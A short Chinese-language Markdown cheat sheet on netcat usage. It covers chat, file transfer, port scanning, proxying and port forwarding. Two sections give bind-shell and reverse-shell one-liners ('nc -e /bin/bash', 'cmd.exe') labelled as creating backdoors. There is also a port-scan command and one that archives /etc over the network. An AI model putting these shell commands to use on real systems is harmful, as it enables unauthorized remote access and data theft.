# nc使用

Chat
```
# 发送端
nc -l 3333
# 接受端
nc 127.0.0.1 3333
```

传送文件
```
# 发送端
`cat backup.iso | nc -l 3333`
# 接收端
`nc 192.168.0.1 3333 > backup.iso`
```


显示传送进度，可以使用管道监控,pv命令
```
`cat backup.iso | pv -b | nc -l 3333`
`nc 192.168.0.1 3333 | pv -b > backup.iso`
```


本地打包文件，传送到远端
```
`tar -czf - /etc/ | nc -l 3333`
`nc 192.168.0.1 3333 | pv -b > mybackup.tar.gz`
```

端口扫描
```
扫描端口，并返回相关信息
nc -z 192.168.0.1 80-90
```

如何正确的加密聊天
```
nc -l 3333
ssh  yantze@192.168.0.1 sleep 1; nc 127.0.0.1 3333
```

如何正确的创建后门
```
nc -l 3333 -e /bin/bash
nc -l 3333 -e cmd.exe
nc 127.0.0.1 3333
```

如何逆向后门
```
nc -l 3333
nc 127.0.0.1 3333 -e /bin/bash
```

指定代理方式
> 以 http 的方式把 host.example.com:42 映射到 192.168.0.2:8080
```
nc -x192.168.0.2:8080 -Xconnect host.example.com 42
```

SSH over Socks
```
ssh -o ProxyCommand='/usr/bin/nc -x 127.0.0.1:1080 %h %p' -i "xxx.pem" user@host
```

nc over pipe ( port forwarding )
```
mkfifo a
mkfifo b
nc 127.0.0.1 8000 <b >a &
nc -l 8001 <a >b &
```

ssh 版本端口转发(远程转发，访问 host:8080 就相当于访问 localhost:80)
```
ssh -R 0.0.0.0:8080:localhost:80 user@host
# -R remote 的缩写
# -R [远程主机:]远程主机端口:登录主机:登录主机端口
# 0.0.0.0:8080 部分就是在 user@host 中建立 LISTEN 0.0.0.0:8080
```

## See Also
- [socat](./socat.md)
- [ssh](./ssh.md)

## Ref
- https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
- http://www.g-loaded.eu/2006/11/06/netcat-a-couple-of-useful-examples/
- https://dragula.viettug.org/blogs/263.html
